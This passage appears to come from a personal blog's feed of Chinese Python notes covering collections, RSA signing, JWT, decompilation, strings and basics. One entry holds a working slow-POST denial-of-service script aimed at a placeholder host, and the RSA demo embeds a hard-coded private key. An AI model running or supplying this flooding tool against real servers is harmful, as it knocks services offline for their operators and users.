        <content type="html"><![CDATA[<pre><code>&quot;&quot;&quot;defaultdict()defaultdict和namedtuple()是collections模块里面2个很实用的扩展类型。一个继承自dict系统内置类型，一个继承自tuple系统内置类型。在扩展的同时都添加了额外的的特性，而且在特定的场合都很实用。&quot;&quot;&quot;from collections import defaultdict, namedtupledef test_defaultdict():    s = [(&#39;yellow&#39;, 1), (&#39;blue&#39;, 2), (&#39;yellow&#39;, 3), (&#39;blue&#39;, 4), (&#39;red&#39;, 1)]    # 设置value默认类型    d = defaultdict(list)    # 会有默认值，所以可以append    for k, v in s:        d[k].append(v)    print(list(d.items()))    d_2 = {}    for k, v in s:        # 可以设置默认值        d_2.setdefault(k, []).append(v)    print(list(d_2.items()))    d_3 = {}    for k, v in s:        # 没有默认值，会报错        d_3[k].append(v)    print(d_3.items())def test_namedtuple():    TPoint = namedtuple(&#39;TPoint&#39;, [&#39;x&#39;, &#39;y&#39;])    # 生成对象    t = [10, 20]    p = TPoint._make(t)    print(p)    p = TPoint(x=11, y=22)    print(p)    # 替换值    p = p._replace(x=44, y=33)    print(p)    # 将字典数据转换成namedtuple类型    d = {&#39;x&#39;: 44, &#39;y&#39;: 55}    p = TPoint(**d)    print(p)    # 常用使用示例    # CityRecord = namedtuple(&#39;City&#39;, &#39;Name, Country, Dsitrict, Population&#39;)    # for city in map(CityRecord._make, cur.fetchall()):    #     print(city.Name, city.Population)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> built-in </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>非对称密钥加解密签名验签.md</title>
      <link href="/2019/12/02/deploy/others/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AD%BE%E5%90%8D%E9%AA%8C%E7%AD%BE/"/>
      <url>/2019/12/02/deploy/others/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AD%BE%E5%90%8D%E9%AA%8C%E7%AD%BE/</url>
      
        <content type="html"><![CDATA[<pre><code># -*- coding: utf-8 -*-from pprint import pprintfrom Crypto.PublicKey import RSAimport base64import Crypto.Signature.PKCS1_v1_5 as sign_PKCS1_v1_5  # 用于签名/验签from Crypto.Cipher import PKCS1_v1_5  # 用于加密from Crypto import Random, Hash# rsa算法生成实例def get_key():    rsa = RSA.generate(1024, Random.new().read)    # master的秘钥对的生成    private_pem = rsa.exportKey()    public_pem = rsa.publickey().exportKey()    return {        &quot;public_key&quot;: public_pem.decode(),        &quot;private_key&quot;: private_pem.decode()    }pprint(get_key())# 生成的公钥私钥对private_key = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQDfEQ82qUrto7h4BL3TsA/DFXSdM44cbeY4kPccD7gLGhaZRClzYKIh5zYdfjBGF+0HXfMa1u9b7GNs2AjVIsx8Kx0QLnMfmtkmGWGhOXz/9IDLKJOx0weKv61gysKItgzVKn2mbLool4R/PQBc3AjDyHw+io1KpVz+3kRTaGs1fQIDAQABAoGAWB4kFWLA/6k6OOcemd4mC9mQ7HyuOdrMJDJX+5TWDkSrArajbTmSMrRkczgjF71h3BQn8cVQXs695ARfUNrjTbi2Y0LjN7ScK7ExzTLdoMEFw5JsHggJZ0zBQY6wmwOdGfqzA6tZPXgkn+jqEha+CD6GrwnTM1oDGJC/aKG2OmECQQDkO9IhUhFc/PSU0zvGE6AOcqk5wlOuvMg+oAFHJHJZ9XW7+X/Nx0ZoVDFq/cZQj+46t+fiwUwhdW7lIfCvNGKFAkEA+jRQmWGKrbf1ns4S0SezJvysd5O6otRGJXr+Ex2uDhc39ZTeUsygkjrLhp8STLMOmql+8g5fghct17EuCX1EmQJBAJz9BNnEkIrst/OSpH/nyeWGOx6uq077LaXd+2MLD9kO/O/Se3V5B9YFa4STkJCjoBMloswXd51gIGpdgSeSmd0CQQCLPrwwcGmWfo+ynqs4PajlpK9zKQMwhYS4bTejedwZOXDKOtx0Ji+i0hfcxwCPMQOKrZPZsIgUxUOdC508aLvZAkBDkHxunCzDm0w4DdTUN7S9YSpVvQEjK/xUQiWaKV128QgskhU2DNdYK2NxifnWrKtx3uQmqMxX5aLuJZ4493yr-----END RSA PRIVATE KEY-----&quot;&quot;&quot;public_key = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfEQ82qUrto7h4BL3TsA/DFXSdM44cbeY4kPccD7gLGhaZRClzYKIh5zYdfjBGF+0HXfMa1u9b7GNs2AjVIsx8Kx0QLnMfmtkmGWGhOXz/9IDLKJOx0weKv61gysKItgzVKn2mbLool4R/PQBc3AjDyHw+io1KpVz+3kRTaGs1fQIDAQAB-----END PUBLIC KEY-----&quot;&quot;&quot;# 公钥加密def rsa_encode(message, public_key):    rsakey = RSA.importKey(public_key)  # 导入读取到的公钥    cipher = PKCS1_v1_5.new(rsakey)  # 生成对象    # 通过生成的对象加密message明文，注意，在python3中加密的数据必须是bytes类型的数据，不能是str类型的数据    cipher_text = base64.b64encode(        cipher.encrypt(message.encode(encoding=&quot;utf-8&quot;)))    # 公钥每次加密的结果不一样跟对数据的padding（填充）有关    return cipher_text.decode()# 私钥解密def rsa_decode(cipher_text, private_key):    rsakey = RSA.importKey(private_key)  # 导入读取到的私钥    cipher = PKCS1_v1_5.new(rsakey)  # 生成对象    # 将密文解密成明文，返回的是一个bytes类型数据，需要自己转换成str    text = cipher.decrypt(base64.b64decode(cipher_text), &quot;ERROR&quot;)    return text.decode()# 私钥签名def to_sign_with_private_key(plain_text):    signer_pri_obj = sign_PKCS1_v1_5.new(RSA.importKey(private_key))    rand_hash = Hash.SHA256.new()    rand_hash.update(plain_text.encode())    signature = signer_pri_obj.sign(rand_hash)    return signature# 公钥验签def to_verify_with_public_key(signature, plain_text):    verifier = sign_PKCS1_v1_5.new(RSA.importKey(public_key))    _rand_hash = Hash.SHA256.new()    _rand_hash.update(plain_text.encode())    verify = verifier.verify(_rand_hash, signature)    return verify  # true / false# 签名/验签def executer_with_signature():    # 签名/验签    text = &quot;I love CA!&quot;    assert to_verify_with_public_key(to_sign_with_private_key(text), text)    print(&quot;rsa Signature verified!&quot;)if __name__ == &#39;__main__&#39;:    message = &quot;你好，世界！&quot;    cipher = rsa_encode(message, public_key)    print(cipher)    msg = rsa_decode(cipher, private_key)    print(msg)    # 你好，世界！    executer_with_signature()</code></pre>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进度条.md</title>
      <link href="/2019/12/02/deploy/others/%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
      <url>/2019/12/02/deploy/others/%E8%BF%9B%E5%BA%A6%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<p>py 示例</p><blockquote><p>实际就是’\r’</p></blockquote><pre><code>import sys, timeimport osclass ProgressBar:    def __init__(self, count = 0, total = 0, width = 50):        self.count = count        self.total = total        self.width = width    def move(self):        self.count += 1    def log(self):        sys.stdout.write(&#39; &#39; * (self.width + 9) + &#39;\r&#39;)        sys.stdout.flush()        progress = self.width * self.count / self.total        sys.stdout.write(&#39;{0:3}/{1:3}: &#39;.format(self.count, self.total))        sys.stdout.write(&#39;#&#39; * int(progress) + &#39;-&#39; * int(self.width - progress) + &#39;\r&#39;)        if progress == self.width:            sys.stdout.write(&#39;\n&#39;)        sys.stdout.flush()bar = ProgressBar(total = 100,width=os.get_terminal_size().columns-9)for i in range(100):    bar.move()    bar.log()    time.sleep(0.1)</code></pre>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py jwt.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20jwt/"/>
      <url>/2019/12/02/deploy/python/libs/py%20jwt/</url>
      
        <content type="html"><![CDATA[<p>参考： <a href="https://segmentfault.com/a/1190000010312468" target="_blank" rel="noopener">理解JWT（JSON Web Token）认证及python实践</a></p><p>例子</p><pre><code>import jwtimport timepayload = {    &quot;iss&quot;: &quot;gusibi.com&quot;,    &quot;iat&quot;: int(time.time()),    &quot;exp&quot;: int(time.time()) + 86400 * 7,    &quot;aud&quot;: &quot;xx&quot;,    &quot;scopes&quot;: [&#39;open&#39;],    &quot;aa&quot;: &quot;cc&quot;,    &#39;name&#39;: &quot;name&quot;}token = jwt.encode(payload, &#39;secret&#39;, algorithm=&#39;HS256&#39;)print(token)payload = jwt.decode(token, &#39;secret&#39;, audience=&#39;xx&#39;, algorithms=[&#39;HS256&#39;])payload = jwt.decode(token, verify=False)  # 不验证信息print(payload)&#39;&#39;&#39;dic 有官方指定的key，程序在解密的时候会根据key的Value判断是否合法。这些key有“exp”: 过期时间“nbf”: 表示当前时间在nbf里的时间之前，则Token不被接受“iss”: token签发者“aud”: 接收者“iat”: 发行时间exp   exp指过期时间，在生成token时，可以设置该token的有效时间，如果我们设置1天过期，1天后我们再解析此token会抛出jwt.exceptions.ExpiredSignatureError: Signature has expirednbfnbf类似于token的 lat ，它指的是该token的生效时间，如果使用但是没到生效时间则抛出jwt.exceptions.ImmatureSignatureError: The token is not yet valid (nbf)ississ指的是该token的签发者，我们可以给他一个字符串。注意，iss 在接收时如果不检验也没有问题，如果我们接收时需要检验但是又签名不一致，则会抛出jwt.exceptions.InvalidIssuerError: Invalid issueraudaud指定了接收者，接收者在接收时必须提供与token要求的一致的接收者（字符串），如果没写接收者或者接收者不一致会抛出jwt.exceptions.InvalidAudienceError: Invalid audienceiatiat指的是token的开始时间，如果当前时间在开始时间之前则抛出jwt.exceptions.InvalidIssuedAtError: Issued At claim (iat) cannot be in the future.&#39;&#39;&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 反编译.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
      <url>/2019/12/02/deploy/python/py%20%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<p>生成单个pyc文件</p><pre><code class="shell">python -m foo.py</code></pre><p>通过代码来生成pyc文件。</p><pre><code class="python">import py_compilepy_compile.compile(&#39;/path/to/foo.py&#39;)</code></pre><p>批量生成pyc文件,针对一个目录下所有的py文件进行编译。</p><pre><code class="python">import compileallcompileall.compile_dir(r&#39;/path&#39;)</code></pre><hr><p>反编译</p><pre><code class="shell">pip install uncompyle</code></pre><p>使用方法<br>我使用pip在mac os上安装好后的可执行文件名叫uncompyle6，很奇葩有没有</p><pre><code># 查看帮助uncompyle6 --help # 将models.pyc反编译成py文件uncompyle6 models.pyc &gt; models.py # 将当前文件夹中所有的pyc文件反编译成后缀名为.pyc_dis的源文件uncompile -o . *.pyc </code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 后缀文件格式说明.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%AF%B4%E6%98%8E/"/>
      <url>/2019/12/02/deploy/python/py%20%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<blockquote><p>.py 文件</p></blockquote><p>Python 最常用格式就是 .py (另一较常用格式为 .pyw)，由 python.exe 解释，可在控制台下运行。</p><blockquote><p>.pxd文件</p></blockquote><ul><li>.pxd 文件是由 Cython 编程语言 “编写” 而成的 Python 扩展模块头文件。</li><li>.pxd 文件类似于 C 语言的 .h 头文件，.pxd 文件中有 Cython 模块要包含的 Cython 声明 (或代码段)。</li><li>.pxd 文件可共享外部 C 语言声明，也能包含 C 编译器内联函数。.pxd 文件还可为 .pyx 文件模块提供 Cython 接口，<br>以便其它 Cython 模块可使用比 Python 更高效的协议与之进行通信。可用 cimport 关键字将 .pxd 文件导入 .pyx 模块文件中。</li></ul><blockquote><p>.pyx文件</p></blockquote><ul><li>.pyx 文件是由 Cython 编程语言 “编写” 而成的 Python 扩展模块源代码文件。</li><li>.pyx 文件类似于 C 语言的 .c 源代码文件，.pyx 文件中有 Cython 模块的源代码。</li></ul><p>不像 Python 语言可直接解释使用的 .py 文件，.pyx 文件必须先被编译成 .c 文件，<br>再编译成 .pyd (Windows 平台) 或 .so (Linux 平台) 文件，才可作为模块 import 导入使用。</p><blockquote><p>.pyd文件</p></blockquote><ul><li>.pyd 文件是非 Python，由其它编程语言 “编写-编译” 生成的 Python 扩展模块。</li></ul><p>Python 要导入 .pyd 文件，实际上是在 .pyd 文件中封装了一个 module。在 python 中使用时，<br>把它当成 module 来用就可以了，即：”import 路径名.modulename” 即可，路径名为 .pyd 文件所在的路径。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py string.md</title>
      <link href="/2019/12/02/deploy/python/built-in/py%20string/"/>
      <url>/2019/12/02/deploy/python/built-in/py%20string/</url>
      
        <content type="html"><![CDATA[<h1 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h1><ol><li>字符串拼接 “+” 号连接 浪费性能，不推荐</li><li>字符串模板<br>‘%s’ :字符串占位符<br>‘%d’ :整型占位符<pre><code class="python">&quot;test %s test&quot; % &quot;this&quot;&quot;test %s test %s&quot; % (&quot;this&quot;,&quot;that&quot;)</code></pre></li><li>优秀拼接方案<pre><code>a = &#39;one&#39;b = &#39;two&#39;c = &#39;three&#39;&quot;,&quot;.join([a,b,c]) #以逗号分隔返回字符串&quot;&quot;.join([a,b,c]) #返回拼接后的字符串</code></pre></li><li>format使用<pre><code class="python">#下面 前面的数字对应后面的位置，也可不填数字，此时前后一一对应a = &quot;test {1} {0} &quot; .format(&quot;one&quot; , &quot;two&quot;)#更人性化的方式a = &quot;test {whose} {fruit} &quot; .format(fruit=&quot;one&quot; , whose=&quot;two&quot;)</code></pre></li><li>字典方式<pre><code class="python">a = &quot;test %(whose)s %(fruit)s&quot; % {&#39;whose&#39;:&#39;my&#39;,&#39;fruit&#39;:&#39;apple&#39;}</code></pre></li></ol><h1 id="string-操作"><a href="#string-操作" class="headerlink" title="string 操作"></a>string 操作</h1><p>字符串替换</p><pre><code class="python">a = a.replace(&quot;原字符串&quot;,&quot;目标字符串&quot;)</code></pre><pre><code class="python">import stringg = string.maketrans(&#39;123&#39;,&quot;abc&quot;) #g 为模板a = &#39;1234567&#39;print(a.translate(g)) #根据模板替换#上面输出为：#abc4567#是逐个替换，有对应关系1-&gt;a这样translate(g,&#39;1&#39;) #删除字符串中全部的 1</code></pre><p>字符串查找</p><pre><code class="python">a.find(&quot;要查询的字符串&quot;)    #返回开始的位置a.find(&quot;要查询的字符串&quot;,20) #从字符串的20位开始查找</code></pre><p>字符串排序</p><pre><code class="python">a = &quot;234rsDSFJ&quot;print(sorted(a,reverse=True))print(sorted(a,key=str.upper))</code></pre><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><pre><code class="python">d = open(&#39;a.txt&#39;, &#39;w&#39;) #打开文件,模式可以是w/r/ad.write(&#39;test,\ntest&#39;)d.close()            #关闭d.readline()d.seek(0)            #偏移量移动到开头d.read(1000)         #读多少个字节</code></pre><pre><code class="python">import linecachelinecache.getline(&quot;a.txt&quot;,int(line)) #获取某一行linecache.getline(&quot;a.txt &quot;)         #获取全部</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> built-in </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 重定向.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E9%87%8D%E5%AE%9A%E5%90%91/"/>
      <url>/2019/12/02/deploy/python/py%20%E9%87%8D%E5%AE%9A%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>重定向写入文件内容</p><pre><code class="python">f = open(&#39;test.txt&#39;,&quot;w&quot;)print(&quot;sfasf&quot;, file=f)print(&quot;1234&quot;, file=f)f.close()</code></pre><p>改变文件描述符</p><pre><code class="python">import osimport sysdef freopen(f, mode, stream):    oldf = open(f, mode)    oldfd = oldf.fileno()    newfd = stream.fileno()    os.close(newfd)    os.dup2(oldfd, newfd)    # print(&quot;&quot;)freopen(&quot;t00.py&quot;, &#39;a&#39;, sys.stdout)freopen(&quot;t00.py&quot;, &#39;a&#39;, sys.stderr)print(&quot;fsfajsfjklasf&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py启动http服务.md</title>
      <link href="/2019/12/02/deploy/others/py%E5%90%AF%E5%8A%A8http%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/12/02/deploy/others/py%E5%90%AF%E5%8A%A8http%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="python-启动-http-服务"><a href="#python-启动-http-服务" class="headerlink" title="python 启动 http 服务"></a>python 启动 http 服务</h2><p>python2：<br>python -m SimpleHTTPServer 8080</p><p>python3：<br>python -m http.server 80</p><p>访问： <a href="http://localhost:端口号/路径" target="_blank" rel="noopener">http://localhost:端口号/路径</a> （默认路径下打开下 index.xml）</p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ddos.md</title>
      <link href="/2019/12/02/deploy/others/ddos/"/>
      <url>/2019/12/02/deploy/others/ddos/</url>
      
        <content type="html"><![CDATA[<p>仅供参考</p><pre><code class="python">#!/usr/bin/env python  import socketimport time  import threading  #Pressure Test,ddos tool  #---------------------------  MAX_CONN=20000  PORT=80  HOST=&quot;域名&quot;  PAGE=&quot;/页面&quot;  #---------------------------  buf=(&quot;POST %s HTTP/1.1\r\n&quot;  &quot;Host: %s\r\n&quot;  &quot;Content-Length: 10000000\r\n&quot;  &quot;Cookie: dklkt_dos_test\r\n&quot;  &quot;\r\n&quot; % (PAGE,HOST))  socks=[]  def conn_thread():      global socks      for i in range(0,MAX_CONN):          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)          try:              s.connect((HOST,PORT))              s.send(buf)              print &quot;Send buf OK!,conn=%d\n&quot;%i              socks.append(s)          except Exception,ex:              print &quot;Could not connect to server or send error:%s&quot;%ex              time.sleep(10)  #end def  def send_thread():      global socks      while True:          for s in socks:              try:                  s.send(&quot;f&quot;)                  #print &quot;send OK!&quot;              except Exception,ex:                  print &quot;Send Exception:%s\n&quot;%ex                  socks.remove(s)                  s.close()          time.sleep(1)  #end def  conn_th=threading.Thread(target=conn_thread,args=())  send_th=threading.Thread(target=send_thread,args=())  conn_th.start()  send_th.start()  </code></pre>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py 入门.md</title>
      <link href="/2019/12/02/deploy/python/py%20%E5%85%A5%E9%97%A8/"/>
      <url>/2019/12/02/deploy/python/py%20%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><table><thead><tr><th align="center">关键字</th><th align="center">类型</th></tr></thead><tbody><tr><td align="center">int</td><td align="center">整型</td></tr><tr><td align="center">int</td><td align="center">整型</td></tr><tr><td align="center">long</td><td align="center">长整型</td></tr><tr><td align="center">float</td><td align="center">浮点数</td></tr><tr><td align="center">boolean</td><td align="center">布尔</td></tr><tr><td align="center">string</td><td align="center">字符串</td></tr><tr><td align="center">list</td><td align="center">列表 []</td></tr><tr><td align="center">tuple</td><td align="center">元组 ()</td></tr><tr><td align="center">dict</td><td align="center">字典 {}</td></tr><tr><td align="center">set</td><td align="center">集合</td></tr></tbody></table><blockquote><p>不可变类型: int, long, float, string, tuple</p></blockquote><blockquote><p>可变类型:   list, dict, set</p></blockquote><ul><li>r”” 不转义</li></ul><h1 id="关于中文"><a href="#关于中文" class="headerlink" title="关于中文"></a>关于中文</h1><blockquote><p>py3原生支持utf8, py2有以下操作</p></blockquote><p>在文件开始添加</p><pre><code class="python"># -*- coding: UTF-8 -*-</code></pre><p>或者这样定义 utf-8 编码的中文字符串</p><pre><code class="python">s = u&quot;中文&quot;</code></pre><p>或者</p><pre><code class="python">a = &quot;啊啊啊啊&quot;a.decode(&#39;utf-8&#39;)  #转换成 utf-8</code></pre><h1 id="有用的函数"><a href="#有用的函数" class="headerlink" title="有用的函数"></a>有用的函数</h1><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">type()</td><td align="center">查看变量的数据类型</td></tr><tr><td align="center">help()</td><td align="center">查看帮助文档</td></tr><tr><td align="center">id()</td><td align="center">查看变量 id</td></tr><tr><td align="center">dir()</td><td align="center">查看有哪些方法</td></tr><tr><td align="center">len()</td><td align="center">查看字符串长度</td></tr><tr><td align="center">sys.getrefcount</td><td align="center">python内部的引用计数</td></tr></tbody></table><h1 id="关于变量"><a href="#关于变量" class="headerlink" title="关于变量"></a>关于变量</h1><ol><li>动态特性 可以赋予不同的数据类型</li><li>多重赋值</li></ol><pre><code class="python">#下面相当于 a,b,c = (&quot;str&quot;,&quot;str1&quot;,4)a,b,c = &quot;str&quot;,&quot;str1&quot;,4del b  #删除变量</code></pre><h1 id="print-使用"><a href="#print-使用" class="headerlink" title="print 使用"></a>print 使用</h1><pre><code class="python">print(2)print(2,3)  # 输出到同一行</code></pre><h1 id="控制流语句"><a href="#控制流语句" class="headerlink" title="控制流语句"></a>控制流语句</h1><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><pre><code class="python"># pass 表示什么都不执行，可以避免报错if True:     passelse:    passif True:    passelif True:    passelse:    passif True:    passif not False:    pass</code></pre><h2 id="布尔值的运算符"><a href="#布尔值的运算符" class="headerlink" title="布尔值的运算符"></a>布尔值的运算符</h2><table><thead><tr><th align="center">关键字</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">全部都为bool值</td></tr><tr><td align="center">or</td><td align="center">至少有一项为bool真</td></tr><tr><td align="center">is</td><td align="center">检查共享，检查是否引用同一个对象</td></tr><tr><td align="center">==</td><td align="center">检查值</td></tr><tr><td align="center">not</td><td align="center">非</td></tr></tbody></table><h2 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h2><pre><code class="python">4 if True else 3#相当于if True:    print(4)else:    print(3)</code></pre><h2 id="while-for"><a href="#while-for" class="headerlink" title="while,for"></a>while,for</h2><pre><code class="python">while True:    print(3)else:    print(&#39;在while正常跑完时执行,没有break&#39;)</code></pre><h2 id="break-continue"><a href="#break-continue" class="headerlink" title="break,continue"></a>break,continue</h2><pre><code class="python">for x in &quot;i am a man&quot;.split(&quot; &quot;):#以空格分隔    print(x)else:    print(&#39;与while相同&#39;)# x保留最后迭代值</code></pre><h2 id="or的运用"><a href="#or的运用" class="headerlink" title="or的运用"></a>or的运用</h2><pre><code class="python">a = url.get(from) or None #如果前一个为null, 则赋值None</code></pre><h2 id="for-使用"><a href="#for-使用" class="headerlink" title="for 使用"></a>for 使用</h2><pre><code class="python">a = &quot;asdfas&quot;for i in a:    print(i)b = [1,2,3,4,5]for i in b:    pirnt(i)c = (&#39;a&#39;,&#39;b&#39;,&#39;c&#39;)for i in c:    print(i)#如果定义了重复的键，只取最后一个a = {&#39;key1&#39;:&#39;value1&#39;,&#39;key2&#39;:&#39;value2&#39;,&#39;key2&#39;:&#39;vale3&#39;}#遍历键for i in a.keys():    print(i)#同时遍历键值for x,y in a.items():    print(x,y)</code></pre><p>根据字典的值得到字典的键</p><ol><li>字典索引的是键，而不是值-&gt;迭代，穷举</li><li>字典具有唯一键，单值却不要求是唯一的</li><li>一个值可能对应多个键</li></ol><h1 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h1><pre><code class="python">g = open(&#39;a.txt&#39;，&#39;w&#39;)g.write(&quot;hahhahahahah\nhahah&quot;)g.close()#下面的代码与上面等同，会自动关闭文件with open(&#39;a.txt&#39;,&#39;a&#39;) as g:    g.write(&#39;xixixi&#39;)</code></pre><h1 id="list-列表"><a href="#list-列表" class="headerlink" title="list(列表)"></a>list(列表)</h1><ol><li>有序的集合</li><li>通过偏移来索引，从而读取数据</li><li>支持嵌套</li><li>可变的类型</li><li>切片：<br>a = [1,2,3，4，5，6，7］<br>正向索引 :a[1:5]<br>反向索引 :a[-4:-1]<br>默认索引 :a[:], a[:3], a[1:]</li></ol><h2 id="添加操作"><a href="#添加操作" class="headerlink" title="添加操作"></a>添加操作</h2><ul><li>‘+’生成一个新的列表</li><li>extend() :接受参数并将该参数的每个元素都添加到原有的列表中，原地修改列表而不是新建列表</li><li>append() :添加任意对象到列表的末端</li><li>insert() :插入任意对象到列表中，可以控制插入位置。</li></ul><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>修改列表本身只需要直接赋值操作就行。</p><pre><code class="python">A   = [1,2,3]A[0]=&#39;haha&#39;</code></pre><h2 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h2><ul><li>del()   :我们通过索引删除指定位置的元素。</li><li>remove():移除列表中指定值的第一个匹配值。如果没找到的话，会抛异常。</li><li>pop()   :返回最后一个元素，并从list中删除它。</li></ul><h2 id="成员关系："><a href="#成员关系：" class="headerlink" title="成员关系："></a>成员关系：</h2><p>In , not in :我们可以判断一个元素是否在列表里。返回一个bool类型，元素在列表里返回true，否则返回fasle.</p><h2 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h2><p>[expr for iter_var in iterable]</p><ol><li>首先迭代iterable里所有内容，每一次迭代，都把iterable里相应内容放到iter_var中，再在表达式中应用该iter_var的内容，最后用表达式的计算值生成一个列表。</li></ol><p>比如我们要生成一个包含1到10的列表</p><pre><code class="python">[x for x in range(1,11)]Range(1,11)</code></pre><p>[expr for iter_var in iterable if cond_expr]</p><ol start="2"><li>加入了判断语句，只有满足条件的内容才把iterable里相应内容放到iter_var中，再在表达式中应用该iter_var的内容，最后用表达式的计算值生成一个列表。</li></ol><p>要生成包含1到10的所有奇数列表。</p><pre><code class="python">range(1,11,2)[x for x in range(1,11) if x % 2 == 1]</code></pre><pre><code>[x*x for x in range(100)]#生成字符串[&#39;the %s&#39;%d for d in xrange(10)]#生成元组[(x,y) for x in range(2) for y in range(2)]#生成字典dict([(x,y) for x in range(3) for y in range(2)])</code></pre><h2 id="内置list方法"><a href="#内置list方法" class="headerlink" title="内置list方法"></a>内置list方法</h2><pre><code>list(a) #返回一个列表，参数是可迭代对象，可传入字符串，元组</code></pre><p>range 返回一个列表对象<br>xrange 返回xrange对象<br>上面的区别在python3中已经没有了</p><p>del a 删除列表对象的引用<br>del a[:] 清空列表对象里的元素</p><h2 id="排序-sort-翻转-reverse"><a href="#排序-sort-翻转-reverse" class="headerlink" title="排序:sort 翻转:reverse"></a>排序:sort 翻转:reverse</h2><p>a = [33,11,22,44]</p><p>b = a.sort() #排序，默认从小到大, 返回值为None<br>b = a. reverse() #反转一个list返回值为none,结合上面从大到小排序</p><h2 id="list-其他操作"><a href="#list-其他操作" class="headerlink" title="list 其他操作"></a>list 其他操作</h2><pre><code class="python">b = a[:]  #这样可以拷贝,而不是拷贝引用</code></pre><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h2><p>set():可变的，不可变的frozenset()</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol><li>添加 add，update</li><li>删除：remove</li><li>交集，并集，差集：&amp; | -</li><li>成员关系 in ,  not in</li><li>set去重，列表内容元素重复<pre><code class="python">a=[1,2,1,2,12,1,2]list(set(a)) #这样可以将列表内容去重</code></pre></li></ol><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>{} , dict()</p><pre><code class="python">info = {&#39;name&#39;:&#39;lilei&#39;,&#39;age&#39;:20}info = dict(name=&#39;lilei&#39;,age=20)</code></pre><p>字典的键必须是不可变的数据类型，比如数字，字符串，元组<br>binfo = {1:’22’,2:’33’}<br>binfo = {(1,2),’as’,(a,b),”df”}</p><p>##添加内容<br>a[‘xx’] = ‘xx’</p><pre><code class="python">info[&#39;phone&#39;] = &#39;iphone&#39;</code></pre><h2 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h2><p>a[‘xx’] = ‘xx’</p><pre><code class="python">例如 info[&#39;phone&#39;] = &#39;htc&#39;</code></pre><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>参数是一个字典的类型，会覆盖相同的值</p><pre><code class="python">info.update({&#39;city&#39;:&#39;beijing&#39;,&#39;phone&#39;:&#39;nokia&#39;})</code></pre><h2 id="删除清空操作"><a href="#删除清空操作" class="headerlink" title="删除清空操作"></a>删除清空操作</h2><pre><code class="python">del info[&#39;phone&#39;]       #删除某个元素info.clear()            #删除字典的全部元素info.pop(&#39;name&#39;)        #返回值，删除键名info.pop(&#39;name&#39;,&#39;1234&#39;) #name 不存在返回默认值 1234</code></pre><h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><pre><code class="python">info.get(&#39;name&#39;)      #没有返回 NoneType 类型info.get(&#39;age2&#39;,&#39;22&#39;) #可以设置默认值</code></pre><h2 id="成员关系操作"><a 